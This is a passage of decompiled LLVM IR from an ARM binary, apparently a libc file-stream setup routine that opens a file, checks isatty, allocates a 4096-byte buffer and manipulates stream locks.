  store i1 %v2_17068, i1* %cpsr_c.global-to-local, align 1
  %v7_17068 = icmp eq i32 %v0_17068, -1
  %v0_17074.pre = load i32, i32* @r4, align 4
  br i1 %v7_17068, label %dec_label_pc_17068._crit_edge, label %bb53

bb53:                                             ; preds = %dec_label_pc_17068
  %v2_1706c = or i32 %v0_17074.pre, 131072
  store i32 %v2_1706c, i32* @r4, align 4
  br label %dec_label_pc_17068._crit_edge

dec_label_pc_17068._crit_edge:                    ; preds = %dec_label_pc_17068, %bb53
  %v0_17074 = phi i32 [ %v2_1706c, %bb53 ], [ %v0_17074.pre, %dec_label_pc_17068 ]
  %v0_17070 = load i32, i32* @r7, align 4
  store i32 %v0_17070, i32* %r0.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_1707c = call i32 @__libc_open(i32 %v0_17070, i32 %v0_17074)
  store i32 %v2_1707c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_17080 = icmp slt i32 %v2_1707c, 0
  %v1_17084 = load i32, i32* @r5, align 4
  %v2_17084 = add i32 %v1_17084, 4
  %v3_17084 = inttoptr i32 %v2_17084 to i32*
  store i32 %v2_1707c, i32* %v3_17084, align 4
  br i1 %v1_17080, label %dec_label_pc_16f90, label %.dec_label_pc_1708c_crit_edge

.dec_label_pc_1708c_crit_edge:                    ; preds = %dec_label_pc_17068._crit_edge
  %v0_17090.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1708c

dec_label_pc_1708c:                               ; preds = %.dec_label_pc_1708c_crit_edge, %dec_label_pc_1705c
  %v0_170a8 = phi i32 [ %v0_17090.pre, %.dec_label_pc_1708c_crit_edge ], [ %v2_17060, %dec_label_pc_1705c ]
  %v0_1708c = load i32, i32* @r5, align 4
  %v1_1708c = inttoptr i32 %v0_1708c to i16*
  %v2_1708c = load i16, i16* %v1_1708c, align 2
  %v3_1708c = zext i16 %v2_1708c to i32
  %v1_17090 = urem i32 %v0_170a8, 4
  %v1_17094 = and i32 %v0_170a8, 1024
  %v1_17098 = and i32 %v3_1708c, 8192
  %v1_1709c = add nuw nsw i32 %v1_17090, 1
  %v2_170a0 = or i32 %v1_17098, %v1_17094
  store i32 %v2_170a0, i32* %r3.global-to-local, align 4
  %v1_170a4 = xor i32 %v1_1709c, 3
  %v1_170a8 = and i32 %v0_170a8, 131072
  store i32 %v1_170a8, i32* %r2.global-to-local, align 4
  %v2_170a8 = icmp eq i32 %v1_170a8, 0
  %v1_170ac = add i32 %v0_1708c, 4
  %v2_170ac = inttoptr i32 %v1_170ac to i32*
  %v3_170ac = load i32, i32* %v2_170ac, align 4
  store i32 %v3_170ac, i32* @r4, align 4
  br i1 %v2_170a8, label %bb55, label %bb54

bb54:                                             ; preds = %dec_label_pc_1708c
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb55

bb55:                                             ; preds = %dec_label_pc_1708c, %bb54
  %v0_170b8 = phi i32 [ 0, %dec_label_pc_1708c ], [ 32768, %bb54 ]
  %v4_170b4 = mul nuw nsw i32 %v1_170a4, 16
  %v5_170b4 = or i32 %v2_170a0, %v4_170b4
  store i32 %v5_170b4, i32* %r3.global-to-local, align 4
  %v2_170b8 = or i32 %v0_170b8, %v5_170b4
  store i32 %v2_170b8, i32* %r2.global-to-local, align 4
  %v2_170bc = icmp ugt i32 %v3_170ac, 2147483646
  store i1 %v2_170bc, i1* %cpsr_c.global-to-local, align 1
  %v8_170bc = icmp eq i32 %v3_170ac, 2147483647
  %v1_170c0 = trunc i32 %v2_170b8 to i16
  store i16 %v1_170c0, i16* %v1_1708c, align 2
  br i1 %v8_170bc, label %dec_label_pc_17100, label %dec_label_pc_170c8

dec_label_pc_170c8:                               ; preds = %bb55
  store i32 49996, i32* %r3.global-to-local, align 4
  %v0_170cc = call i32 @__aeabi_read_tp()
  %v3_170d0 = load i16, i16* @global_var_23424.488, align 2
  %v4_170d0 = sext i16 %v3_170d0 to i32
  store i32 %v4_170d0, i32* @r3, align 4
  store i32 %v0_170cc, i32* @r6, align 4
  %v0_170d8 = load i32, i32* @r4, align 4
  store i32 %v0_170d8, i32* @r0, align 4
  %v2_170dc = add i32 %v4_170d0, %v0_170cc
  %v3_170dc = inttoptr i32 %v2_170dc to i32*
  %v4_170dc = load i32, i32* %v3_170dc, align 4
  store i32 %v4_170dc, i32* @r4, align 4
  %v1_170e0 = call i32 @isatty(i32 %v0_170d8)
  store i32 %v1_170e0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_170e4 = icmp eq i32 %v1_170e0, 0
  br i1 %v2_170e4, label %.thread5, label %bb56

bb56:                                             ; preds = %dec_label_pc_170c8
  %v1_170e8 = load i32, i32* @r5, align 4
  %v2_170e8 = inttoptr i32 %v1_170e8 to i16*
  %v3_170e8 = load i16, i16* %v2_170e8, align 2
  %v4_170e8 = zext i16 %v3_170e8 to i32
  %v2_170ec = or i32 %v4_170e8, 256
  store i32 %v2_170ec, i32* %r3.global-to-local, align 4
  %v2_170f0 = trunc i32 %v2_170ec to i16
  store i16 %v2_170f0, i16* %v2_170e8, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_170c8, %bb56
  %v3_170f8 = load i16, i16* @global_var_23424.488, align 2
  %v4_170f8 = sext i16 %v3_170f8 to i32
  store i32 %v4_170f8, i32* %r3.global-to-local, align 4
  %v0_170fc = load i32, i32* @r4, align 4
  %v1_170fc = load i32, i32* @r6, align 4
  %v3_170fc = add i32 %v1_170fc, %v4_170f8
  %v4_170fc = inttoptr i32 %v3_170fc to i32*
  store i32 %v0_170fc, i32* %v4_170fc, align 4
  br label %dec_label_pc_17100

dec_label_pc_17100:                               ; preds = %bb55, %.thread5
  %v0_17100 = load i32, i32* @r5, align 4
  %v1_17100 = add i32 %v0_17100, 8
  %v2_17100 = inttoptr i32 %v1_17100 to i32*
  %v3_17100 = load i32, i32* %v2_17100, align 4
  store i32 %v3_17100, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17104 = icmp eq i32 %v3_17100, 0
  br i1 %v2_17104, label %dec_label_pc_1710c, label %bb57

dec_label_pc_1710c:                               ; preds = %dec_label_pc_17100
  store i32 4096, i32* @r0, align 4
  %v0_17110 = call i32 @malloc()
  store i32 %v0_17110, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17114 = icmp eq i32 %v0_17110, 0
  %v1_17124.pre = load i32, i32* @r5, align 4
  br i1 %v2_17114, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1710c
  %v2_17118 = inttoptr i32 %v1_17124.pre to i16*
  %v3_17118 = load i16, i16* %v2_17118, align 2
  %v4_17118 = zext i16 %v3_17118 to i32
  %v2_1711c = add i32 %v0_17110, 4096
  store i32 %v2_1711c, i32* %r2.global-to-local, align 4
  %v2_17120 = or i32 %v4_17118, 16384
  store i32 %v2_17120, i32* %r3.global-to-local, align 4
  %v2_17124 = add i32 %v1_17124.pre, 8
  %v3_17124 = inttoptr i32 %v2_17124 to i32*
  store i32 %v0_17110, i32* %v3_17124, align 4
  %v1_17128 = load i32, i32* %r2.global-to-local, align 4
  %v2_17128 = load i32, i32* @r5, align 4
  %v3_17128 = add i32 %v2_17128, 12
  %v4_17128 = inttoptr i32 %v3_17128 to i32*
  store i32 %v1_17128, i32* %v4_17128, align 4
  %v1_1712c = load i32, i32* %r3.global-to-local, align 4
  %v2_1712c = trunc i32 %v1_1712c to i16
  %v3_1712c = load i32, i32* @r5, align 4
  %v4_1712c = inttoptr i32 %v3_1712c to i16*
  store i16 %v2_1712c, i16* %v4_1712c, align 2
  br label %bb57

.thread9:                                         ; preds = %dec_label_pc_1710c
  %v2_1712437 = add i32 %v1_17124.pre, 8
  %v3_1712438 = inttoptr i32 %v2_1712437 to i32*
  store i32 0, i32* %v3_1712438, align 4
  %v2_17130 = load i32, i32* @r5, align 4
  %v3_17130 = add i32 %v2_17130, 12
  %v4_17130 = inttoptr i32 %v3_17130 to i32*
  store i32 0, i32* %v4_17130, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %dec_label_pc_17100, %.thread9
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_1713c = load i32, i32* @r8, align 4
  %v2_1713c = add i32 %v0_1713c, 92
  %v3_1713c = inttoptr i32 %v2_1713c to i32*
  %v4_1713c = load i32, i32* %v3_1713c, align 4
  store i32 %v4_1713c, i32* %r3.global-to-local, align 4
  %v2_17140 = load i32, i32* @r5, align 4
  %v3_17140 = add i32 %v2_17140, 2
  %v4_17140 = inttoptr i32 %v3_17140 to i8*
  store i8 0, i8* %v4_17140, align 1
  %v0_17144 = load i32, i32* @r5, align 4
  %v1_17144 = inttoptr i32 %v0_17144 to i16*
  %v2_17144 = load i16, i16* %v1_17144, align 2
  %v3_17144 = zext i16 %v2_17144 to i32
  store i32 %v3_17144, i32* %r2.global-to-local, align 4
  %v0_17148 = load i32, i32* %r3.global-to-local, align 4
  %v1_17148 = inttoptr i32 %v0_17148 to i32*
  %v2_17148 = load i32, i32* %v1_17148, align 4
  store i32 %v2_17148, i32* @r1, align 4
  %v1_1714c = add i32 %v0_17144, 8
  %v2_1714c = inttoptr i32 %v1_1714c to i32*
  %v3_1714c = load i32, i32* %v2_1714c, align 4
  store i32 %v3_1714c, i32* %r3.global-to-local, align 4
  %v1_17150 = and i32 %v3_17144, 8192
  %v2_17150 = icmp eq i32 %v1_17150, 0
  %v2_17154 = add i32 %v0_17144, 20
  %v3_17154 = inttoptr i32 %v2_17154 to i32*
  store i32 %v3_1714c, i32* %v3_17154, align 4
  %v0_17158 = load i32, i32* @r1, align 4
  %v1_17158 = load i32, i32* @r5, align 4
  %v2_17158 = add i32 %v1_17158, 52
  %v3_17158 = inttoptr i32 %v2_17158 to i32*
  store i32 %v0_17158, i32* %v3_17158, align 4
  %v0_1715c = load i32, i32* %r3.global-to-local, align 4
  %v1_1715c = load i32, i32* @r5, align 4
  %v2_1715c = add i32 %v1_1715c, 24
  %v3_1715c = inttoptr i32 %v2_1715c to i32*
  store i32 %v0_1715c, i32* %v3_1715c, align 4
  %v0_17160 = load i32, i32* %r3.global-to-local, align 4
  %v1_17160 = load i32, i32* @r5, align 4
  %v2_17160 = add i32 %v1_17160, 28
  %v3_17160 = inttoptr i32 %v2_17160 to i32*
  store i32 %v0_17160, i32* %v3_17160, align 4
  %v0_17164 = load i32, i32* %r3.global-to-local, align 4
  %v1_17164 = load i32, i32* @r5, align 4
  %v2_17164 = add i32 %v1_17164, 16
  %v3_17164 = inttoptr i32 %v2_17164 to i32*
  store i32 %v0_17164, i32* %v3_17164, align 4
  %v0_17168 = load i32, i32* %r4.global-to-local, align 4
  %v1_17168 = load i32, i32* @r5, align 4
  %v2_17168 = add i32 %v1_17168, 44
  %v3_17168 = inttoptr i32 %v2_17168 to i32*
  store i32 %v0_17168, i32* %v3_17168, align 4
  br i1 %v2_17150, label %dec_label_pc_17350, label %dec_label_pc_17170

dec_label_pc_17170:                               ; preds = %bb57
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17174 = load i32, i32* @r8, align 4
  %v2_17174 = add i32 %v0_17174, 160
  %v3_17174 = inttoptr i32 %v2_17174 to i32*
  %v4_17174 = load i32, i32* %v3_17174, align 4
  store i32 %v4_17174, i32* %r7.global-to-local, align 4
  %v0_17178 = call i32 @__aeabi_read_tp()
  store i32 %v0_17178, i32* %r0.global-to-local, align 4
  %v1_1717c = add i32 %v4_17174, 8
  %v2_1717c = inttoptr i32 %v1_1717c to i32*
  %v3_1717c = load i32, i32* %v2_1717c, align 4
  store i32 %v3_1717c, i32* %r3.global-to-local, align 4
  %v1_17180 = add i32 %v0_17178, -1168
  store i32 %v1_17180, i32* %r6.global-to-local, align 4
  %v3_17184 = icmp uge i32 %v3_1717c, %v1_17180
  store i1 %v3_17184, i1* %cpsr_c.global-to-local, align 1
  %v9_17184 = icmp eq i32 %v3_1717c, %v1_17180
  br i1 %v9_17184, label %dec_label_pc_171c8, label %dec_label_pc_1718c

dec_label_pc_1718c:                               ; preds = %dec_label_pc_17170
  store i32 %v4_17174, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17194

dec_label_pc_17194:                               ; preds = %dec_label_pc_171a0.dec_label_pc_17194_crit_edge, %dec_label_pc_1718c
  %v0_17194 = phi i32 [ %v0_17194.pre, %dec_label_pc_171a0.dec_label_pc_17194_crit_edge ], [ %v4_17174, %dec_label_pc_1718c ]
  %v1_17194 = inttoptr i32 %v0_17194 to i32*
  %v2_17194 = load i32, i32* %v1_17194, align 4
  store i32 %v2_17194, i32* %r3.global-to-local, align 4
  %v1_17198 = load i32, i32* %r4.global-to-local, align 4
  %v3_17198 = icmp uge i32 %v2_17194, %v1_17198
  store i1 %v3_17198, i1* %cpsr_c.global-to-local, align 1
  %v9_17198 = icmp eq i32 %v2_17194, %v1_17198
  br i1 %v9_17198, label %dec_label_pc_171a0, label %dec_label_pc_171b8

dec_label_pc_171a0:                               ; preds = %dec_label_pc_17194
  store i32 %v2_17194, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_171b0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_171b0, label %dec_label_pc_171b4, label %dec_label_pc_171a0.dec_label_pc_17194_crit_edge

dec_label_pc_171a0.dec_label_pc_17194_crit_edge:  ; preds = %dec_label_pc_171a0
  %v0_17194.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17194

dec_label_pc_171b4:                               ; preds = %dec_label_pc_171a0
  %v0_171b4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_171b4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_171b8

dec_label_pc_171b8:                               ; preds = %dec_label_pc_17194, %dec_label_pc_171b4
  %v0_171b8 = phi i32 [ %v0_171b4, %dec_label_pc_171b4 ], [ %v2_17194, %dec_label_pc_17194 ]
  %v1_171b8 = phi i32 [ %v0_171b4, %dec_label_pc_171b4 ], [ %v1_17198, %dec_label_pc_17194 ]
  %v3_171b8 = icmp uge i32 %v0_171b8, %v1_171b8
  store i1 %v3_171b8, i1* %cpsr_c.global-to-local, align 1
  %v9_171b8 = icmp eq i32 %v0_171b8, %v1_171b8
  br i1 %v9_171b8, label %bb59, label %bb58

bb58:                                             ; preds = %dec_label_pc_171b8
  %v1_171bc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_171bc, i32* %r0.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_171b8, %bb58
  %v1_171c0 = xor i1 %v9_171b8, true
  call void @__pseudo_cond_branch(i1 %v1_171c0, i32 ptrtoint (i32* @global_var_15410.657 to i32))
  %v0_171c4 = load i32, i32* %r6.global-to-local, align 4
  %v1_171c4 = load i32, i32* %r7.global-to-local, align 4
  %v2_171c4 = add i32 %v1_171c4, 8
  %v3_171c4 = inttoptr i32 %v2_171c4 to i32*
  store i32 %v0_171c4, i32* %v3_171c4, align 4
  %v1_171e4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_171c8

dec_label_pc_171c8:                               ; preds = %dec_label_pc_17170, %bb59
  %v1_171e4 = phi i32 [ %v3_1717c, %dec_label_pc_17170 ], [ %v1_171e4.pre, %bb59 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_171cc = load i32, i32* @r8, align 4
  %v2_171cc = add i32 %v0_171cc, 160
  %v3_171cc = inttoptr i32 %v2_171cc to i32*
  %v4_171cc = load i32, i32* %v3_171cc, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_171d4 = add i32 %v0_171cc, 152
  %v3_171d4 = inttoptr i32 %v2_171d4 to i32*
  %v4_171d4 = load i32, i32* %v3_171d4, align 4
  store i32 %v4_171d4, i32* %r7.global-to-local, align 4
  %v1_171d8 = add i32 %v4_171cc, 4
  %v2_171d8 = inttoptr i32 %v1_171d8 to i32*
  %v3_171d8 = load i32, i32* %v2_171d8, align 4
  store i32 %v3_171d8, i32* %r3.global-to-local, align 4
  %v1_171dc = add i32 %v4_171d4, 8
  %v2_171dc = inttoptr i32 %v1_171dc to i32*
  %v3_171dc = load i32, i32* %v2_171dc, align 4
  store i32 %v3_171dc, i32* %r2.global-to-local, align 4
  %v1_171e0 = add i32 %v3_171d8, 1
  store i32 %v1_171e0, i32* %r3.global-to-local, align 4
  %v3_171e4 = icmp uge i32 %v3_171dc, %v1_171e4
  store i1 %v3_171e4, i1* %cpsr_c.global-to-local, align 1
  %v9_171e4 = icmp eq i32 %v3_171dc, %v1_171e4
  store i32 %v1_171e0, i32* %v2_171d8, align 4
  br i1 %v9_171e4, label %dec_label_pc_17230, label %dec_label_pc_171f0

dec_label_pc_171f0:                               ; preds = %dec_label_pc_171c8
  %v0_171f4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_171f4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_171fc95 = inttoptr i32 %v0_171f4 to i32*
  %v2_171fc96 = load i32, i32* %v1_171fc95, align 4
  store i32 %v2_171fc96, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1720098 = icmp eq i32 %v2_171fc96, 0
  br i1 %v9_1720098, label %dec_label_pc_17208, label %dec_label_pc_17220

dec_label_pc_17208:                               ; preds = %dec_label_pc_171f0, %dec_label_pc_17208.dec_label_pc_171fc_crit_edge
  %v0_1720899 = phi i32 [ %v1_17200.pre, %dec_label_pc_17208.dec_label_pc_171fc_crit_edge ], [ 0, %dec_label_pc_171f0 ]
  store i32 %v0_1720899, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17218 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17218, label %dec_label_pc_1721c, label %dec_label_pc_17208.dec_label_pc_171fc_crit_edge

dec_label_pc_17208.dec_label_pc_171fc_crit_edge:  ; preds = %dec_label_pc_17208
  %v0_171fc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17200.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_171fc = inttoptr i32 %v0_171fc.pre to i32*
  %v2_171fc = load i32, i32* %v1_171fc, align 4
  store i32 %v2_171fc, i32* %r3.global-to-local, align 4
  %v3_17200 = icmp uge i32 %v2_171fc, %v1_17200.pre
  store i1 %v3_17200, i1* %cpsr_c.global-to-local, align 1
  %v9_17200 = icmp eq i32 %v2_171fc, %v1_17200.pre
  br i1 %v9_17200, label %dec_label_pc_17208, label %dec_label_pc_17220

dec_label_pc_1721c:                               ; preds = %dec_label_pc_17208
  %v0_1721c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1721c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17220

dec_label_pc_17220:                               ; preds = %dec_label_pc_171f0, %dec_label_pc_17208.dec_label_pc_171fc_crit_edge, %dec_label_pc_1721c
  %v0_17220 = phi i32 [ %v0_1721c, %dec_label_pc_1721c ], [ %v2_171fc96, %dec_label_pc_171f0 ], [ %v2_171fc, %dec_label_pc_17208.dec_label_pc_171fc_crit_edge ]
  %v1_17220 = phi i32 [ %v0_1721c, %dec_label_pc_1721c ], [ 0, %dec_label_pc_171f0 ], [ %v1_17200.pre, %dec_label_pc_17208.dec_label_pc_171fc_crit_edge ]
  %v3_17220 = icmp uge i32 %v0_17220, %v1_17220
  store i1 %v3_17220, i1* %cpsr_c.global-to-local, align 1
  %v9_17220 = icmp eq i32 %v0_17220, %v1_17220
  br i1 %v9_17220, label %bb61, label %bb60

bb60:                                             ; preds = %dec_label_pc_17220
  %v1_17224 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_17224, i32* %r0.global-to-local, align 4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_17220, %bb60
  %v1_17228 = xor i1 %v9_17220, true
  call void @__pseudo_cond_branch(i1 %v1_17228, i32 ptrtoint (i32* @global_var_15410.657 to i32))
  %v0_1722c = load i32, i32* %r6.global-to-local, align 4
  %v1_1722c = load i32, i32* %r7.global-to-local, align 4
  %v2_1722c = add i32 %v1_1722c, 8
  %v3_1722c = inttoptr i32 %v2_1722c to i32*
  store i32 %v0_1722c, i32* %v3_1722c, align 4
  br label %dec_label_pc_17230

dec_label_pc_17230:                               ; preds = %dec_label_pc_171c8, %bb61
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_17234 = load i32, i32* @r8, align 4
  %v2_17234 = add i32 %v0_17234, 152
  %v3_17234 = inttoptr i32 %v2_17234 to i32*
  %v4_17234 = load i32, i32* %v3_17234, align 4
  store i32 %v4_17234, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_1723c = add i32 %v0_17234, 76
  %v3_1723c = inttoptr i32 %v2_1723c to i32*
  %v4_1723c = load i32, i32* %v3_1723c, align 4
  store i32 %v4_1723c, i32* @r1, align 4
  %v1_17240 = add i32 %v4_17234, 4
  %v2_17240 = inttoptr i32 %v1_17240 to i32*
  %v3_17240 = load i32, i32* %v2_17240, align 4
  store i32 %v3_17240, i32* %r3.global-to-local, align 4
  %v1_17244 = inttoptr i32 %v4_1723c to i32*
  %v2_17244 = load i32, i32* %v1_17244, align 4
  store i32 %v2_17244, i32* %r2.global-to-local, align 4
  %v1_17248 = add i32 %v3_17240, 1
  store i32 %v1_17248, i32* %r3.global-to-local, align 4
  store i32 %v1_17248, i32* %v2_17240, align 4
  %v0_17250 = load i32, i32* %r2.global-to-local, align 4
  %v1_17250 = load i32, i32* @r5, align 4
  %v2_17250 = add i32 %v1_17250, 32
  %v3_17250 = inttoptr i32 %v2_17250 to i32*
  store i32 %v0_17250, i32* %v3_17250, align 4
  %v0_17254 = load i32, i32* %r0.global-to-local, align 4
  %v1_17254 = add i32 %v0_17254, 4
  %v2_17254 = inttoptr i32 %v1_17254 to i32*
  %v3_17254 = load i32, i32* %v2_17254, align 4
  %v1_17258 = add i32 %v3_17254, -1
  store i32 %v1_17258, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1725c = icmp eq i32 %v1_17258, 0
  %v0_17260 = load i32, i32* @r5, align 4
  %v1_17260 = load i32, i32* @r1, align 4
  %v2_17260 = inttoptr i32 %v1_17260 to i32*
  store i32 %v0_17260, i32* %v2_17260, align 4
  %v0_17264 = load i32, i32* %r3.global-to-local, align 4
  %v1_17264 = load i32, i32* %r0.global-to-local, align 4
  %v2_17264 = add i32 %v1_17264, 4
  %v3_17264 = inttoptr i32 %v2_17264 to i32*
  store i32 %v0_17264, i32* %v3_17264, align 4
  br i1 %v2_1725c, label %dec_label_pc_1726c, label %dec_label_pc_172cc

dec_label_pc_1726c:                               ; preds = %dec_label_pc_17230
  %v0_1726c = load i32, i32* %r3.global-to-local, align 4
  %v1_1726c = load i32, i32* %r0.global-to-local, align 4
  %v2_1726c = add i32 %v1_1726c, 8
  %v3_1726c = inttoptr i32 %v2_1726c to i32*
  store i32 %v0_1726c, i32* %v3_1726c, align 4
  %v0_17270 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17270, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17274

dec_label_pc_17274:                               ; preds = %dec_label_pc_172a4.dec_label_pc_17274_crit_edge, %dec_label_pc_1726c
  %v0_17274 = phi i32 [ %v0_17274.pre, %dec_label_pc_172a4.dec_label_pc_17274_crit_edge ], [ %v0_17270, %dec_label_pc_1726c ]
  %v1_17274 = inttoptr i32 %v0_17274 to i32*
  %v2_17274 = load i32, i32* %v1_17274, align 4
  store i32 %v2_17274, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_17274, i32* %r2.global-to-local, align 4
  %v2_1728083 = load i32, i32* %v1_17274, align 4
  store i32 %v2_1728083, i32* %r3.global-to-local, align 4
  %v3_1728485 = icmp uge i32 %v2_1728083, %v2_17274
  store i1 %v3_1728485, i1* %cpsr_c.global-to-local, align 1
  %v9_1728491 = icmp eq i32 %v2_1728083, %v2_17274
  br i1 %v9_1728491, label %dec_label_pc_1728c, label %dec_label_pc_172a4

dec_label_pc_1728c:                               ; preds = %dec_label_pc_17274, %dec_label_pc_1728c.dec_label_pc_17280_crit_edge
  %v0_1728c92 = phi i32 [ %v1_17284.pre, %dec_label_pc_1728c.dec_label_pc_17280_crit_edge ], [ %v2_17274, %dec_label_pc_17274 ]
  store i32 %v0_1728c92, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1729c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1729c, label %dec_label_pc_172a0, label %dec_label_pc_1728c.dec_label_pc_17280_crit_edge

dec_label_pc_1728c.dec_label_pc_17280_crit_edge:  ; preds = %dec_label_pc_1728c
  %v0_17280.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17284.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17280 = inttoptr i32 %v0_17280.pre to i32*
  %v2_17280 = load i32, i32* %v1_17280, align 4
  store i32 %v2_17280, i32* %r3.global-to-local, align 4
  %v3_17284 = icmp uge i32 %v2_17280, %v1_17284.pre
  store i1 %v3_17284, i1* %cpsr_c.global-to-local, align 1
  %v9_17284 = icmp eq i32 %v2_17280, %v1_17284.pre
  br i1 %v9_17284, label %dec_label_pc_1728c, label %dec_label_pc_172a4

dec_label_pc_172a0:                               ; preds = %dec_label_pc_1728c
  %v0_172a0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_172a0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_172a4

dec_label_pc_172a4:                               ; preds = %dec_label_pc_17274, %dec_label_pc_1728c.dec_label_pc_17280_crit_edge, %dec_label_pc_172a0
  %v0_172ac = phi i32 [ %v0_172a0, %dec_label_pc_172a0 ], [ %v2_1728083, %dec_label_pc_17274 ], [ %v2_17280, %dec_label_pc_1728c.dec_label_pc_17280_crit_edge ]
  %v1_172a4 = phi i32 [ %v0_172a0, %dec_label_pc_172a0 ], [ %v2_17274, %dec_label_pc_17274 ], [ %v1_17284.pre, %dec_label_pc_1728c.dec_label_pc_17280_crit_edge ]
  %v3_172a4 = icmp uge i32 %v0_172ac, %v1_172a4
  store i1 %v3_172a4, i1* %cpsr_c.global-to-local, align 1
  %v9_172a4 = icmp eq i32 %v0_172ac, %v1_172a4
  br i1 %v9_172a4, label %dec_label_pc_172ac, label %dec_label_pc_172a4.dec_label_pc_17274_crit_edge

dec_label_pc_172a4.dec_label_pc_17274_crit_edge:  ; preds = %dec_label_pc_172a4
  %v0_17274.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17274

dec_label_pc_172ac:                               ; preds = %dec_label_pc_172a4
  %v2_172ac = icmp ne i32 %v1_172a4, 0
  store i1 %v2_172ac, i1* %cpsr_c.global-to-local, align 1
  %v7_172b0 = icmp slt i32 %v1_172a4, 2
  br i1 %v7_172b0, label %dec_label_pc_172cc, label %dec_label_pc_172b4

dec_label_pc_172b4:                               ; preds = %dec_label_pc_172ac
  %v0_172b4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_172b4, i32* %r0.global-to-local, align 4
  %v0_172b8 = load i32, i32* @r1, align 4
  %v1_172b8 = add i32 %v0_172b8, 129
  store i32 %v1_172b8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_172cc

dec_label_pc_172cc:                               ; preds = %dec_label_pc_17230, %dec_label_pc_172b4, %dec_label_pc_172ac
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_172d0 = load i32, i32* @r8, align 4
  %v2_172d0 = add i32 %v0_172d0, 160
  %v3_172d0 = inttoptr i32 %v2_172d0 to i32*
  %v4_172d0 = load i32, i32* %v3_172d0, align 4
  store i32 %v4_172d0, i32* %r0.global-to-local, align 4
  %v1_172d4 = add i32 %v4_172d0, 4
  %v2_172d4 = inttoptr i32 %v1_172d4 to i32*
  %v3_172d4 = load i32, i32* %v2_172d4, align 4
  %v1_172d8 = add i32 %v3_172d4, -1
  store i32 %v1_172d8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_172dc = icmp eq i32 %v1_172d8, 0
  store i32 %v1_172d8, i32* %v2_172d4, align 4
  br i1 %v2_172dc, label %dec_label_pc_172e8, label %dec_label_pc_17350

dec_label_pc_172e8:                               ; preds = %dec_label_pc_172cc
  %v0_172e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_172e8 = load i32, i32* %r0.global-to-local, align 4
  %v2_172e8 = add i32 %v1_172e8, 8
  %v3_172e8 = inttoptr i32 %v2_172e8 to i32*
  store i32 %v0_172e8, i32* %v3_172e8, align 4
  %v0_172ec = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_172ec, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_172f0

dec_label_pc_172f0:                               ; preds = %dec_label_pc_17320.dec_label_pc_172f0_crit_edge, %dec_label_pc_172e8
  %v0_172f0 = phi i32 [ %v0_172f0.pre, %dec_label_pc_17320.dec_label_pc_172f0_crit_edge ], [ %v0_172ec, %dec_label_pc_172e8 ]
  %v1_172f0 = inttoptr i32 %v0_172f0 to i32*
  %v2_172f0 = load i32, i32* %v1_172f0, align 4
  store i32 %v2_172f0, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
